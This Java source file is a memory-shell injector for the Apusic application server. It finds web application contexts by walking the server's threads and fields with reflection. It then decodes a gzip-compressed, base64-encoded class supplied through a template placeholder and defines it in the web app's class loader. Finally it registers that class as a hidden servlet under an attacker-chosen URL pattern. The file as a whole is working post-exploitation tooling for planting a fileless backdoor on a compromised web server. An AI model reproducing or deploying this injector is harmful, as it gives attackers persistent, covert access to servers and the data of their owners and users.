package com.reajason.javaweb.memshell.injector.apusic;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2024/12/27
 */
public class ApusicServletInjector {

    private static String msg = "";
    private static boolean ok = false;

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public ApusicServletInjector() {
        if (ok) {
            return;
        }
        Set<Object> contexts = null;
        try {
            contexts = getContext();
        } catch (Throwable throwable) {
            msg += "context error: " + getErrorMessage(throwable);
        }
        if (contexts == null || contexts.isEmpty()) {
            msg += "context not found";
        } else {
            for (Object context : contexts) {
                try {
                    msg += ("context: [" + getContextRoot(context) + "] ");
                    Object shell = getShell(context);
                    inject(context, shell);
                    msg += "[" + getUrlPattern() + "] ready\n";
                } catch (Throwable e) {
                    msg += "failed " + getErrorMessage(e) + "\n";
                }
            }
        }
        ok = true;
        System.out.println(msg);
    }

    @SuppressWarnings("all")
    private String getContextRoot(Object context) {
        String r = null;
        try {
            r = (String) invokeMethod(context, "getContextPath", null, null);
        } catch (Exception ignored) {
        }
        String c = context.getClass().getName();
        if (r == null) {
            return c;
        }
        if (r.isEmpty()) {
            return c + "(/)";
        }
        return c + "(" + r + ")";
    }

    public Set<Object> getContext() throws Exception {
        Set<Object> contexts = new HashSet<Object>();
        Set<Thread> threads = Thread.getAllStackTraces().keySet();
        for (Thread thread : threads) {
            if (thread.getName().contains("HouseKeeper")) {
                // Apusic 9.0 SPX
                Object sessionManager = getFieldValue(thread, "this$0");
                contexts.add(getFieldValue(sessionManager, "container"));
            } else if (thread.getName().contains("HTTPSession")) {
                // Apusic 9.0.1
                Object sessionManager = getFieldValue(thread, "this$0");
                Map<?, ?> contextMap = ((Map<?, ?>) getFieldValue(getFieldValue(sessionManager, "vhost"), "contexts"));
                contexts.addAll(contextMap.values());
            }
        }
        return contexts;
    }

    private Object getShell(Object context) throws Exception {
        // WebApp 类加载器，ServletContext 使用这个进行组件的类加载
        ClassLoader loader = (ClassLoader) getFieldValue(context, "loader");
        ClassLoader defineLoader;
        Object obj;
        try {
            // Apusic 9.0 SPX，优先从当前 loader 进行加载
            defineShell(loader);
            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
            obj = loader.loadClass(getClassName()).newInstance();
            defineLoader = loader;
        } catch (ClassNotFoundException e) {
            // Apusic 9.0.1，委托给 jspLoader 进行加载，因此直接往 loader 里面 define 会 ClassNotFound
            ClassLoader internalLoader = (ClassLoader) getFieldValue(getFieldValue(loader, "delegate"), "jspLoader");
            defineShell(internalLoader);
            // 模拟组件初始化（尝试使用 WebApp 类加载器进行组件类实例化）
            obj = loader.loadClass(getClassName()).newInstance();
            defineLoader = internalLoader;
        }
        msg += "[" + defineLoader.getClass().getName() + "] ";
        return obj;
    }

    @SuppressWarnings("all")
    private void defineShell(ClassLoader classLoader) throws Exception {
        try {
            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
        } catch (Throwable ignored) {
        }
    }

    public void inject(Object context, Object servlet) throws Exception {
        Object webModule = getFieldValue(context, "webapp");
        Object servletMapper = getFieldValue(context, "servletMapper");
        if (invokeMethod(webModule, "getServlet", new Class[]{String.class}, new Object[]{getClassName()}) != null) {
            return;
        }
        invokeMethod(webModule, "addServlet", new Class[]{String.class, String.class}, new Object[]{getClassName(), getClassName()});
        invokeMethod(servletMapper, "addMapping", new Class[]{String.class, boolean.class, String[].class}, new Object[]{getClassName(), true, new String[]{getUrlPattern()}});
    }

    @Override
    public String toString() {
        return msg;
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } finally {
            if (gzipInputStream != null) {
                gzipInputStream.close();
            }
            out.close();
        }
    }

    @SuppressWarnings("all")
    public static Object getFieldValue(Object obj, String fieldName) throws Exception {
        Field field = getField(obj, fieldName);
        field.setAccessible(true);
        return field.get(obj);
    }

    @SuppressWarnings("all")
    public static Field getField(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    @SuppressWarnings("all")
    public static Object invokeMethod(Object obj, String methodName, Class<?>[] paramClazz, Object[] param) throws Exception {
        Class<?> clazz = (obj instanceof Class) ? (Class<?>) obj : obj.getClass();
        Method method = null;
        while (clazz != null && method == null) {
            try {
                if (paramClazz == null) {
                    method = clazz.getDeclaredMethod(methodName);
                } else {
                    method = clazz.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                clazz = clazz.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException("Method not found: " + methodName);
        }
        method.setAccessible(true);
        return method.invoke(obj instanceof Class ? null : obj, param);
    }

    @SuppressWarnings("all")
    private String getErrorMessage(Throwable throwable) {
        PrintStream printStream = null;
        try {
            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
            printStream = new PrintStream(outputStream);
            throwable.printStackTrace(printStream);
            return outputStream.toString();
        } finally {
            if (printStream != null) {
                printStream.close();
            }
        }
    }
}
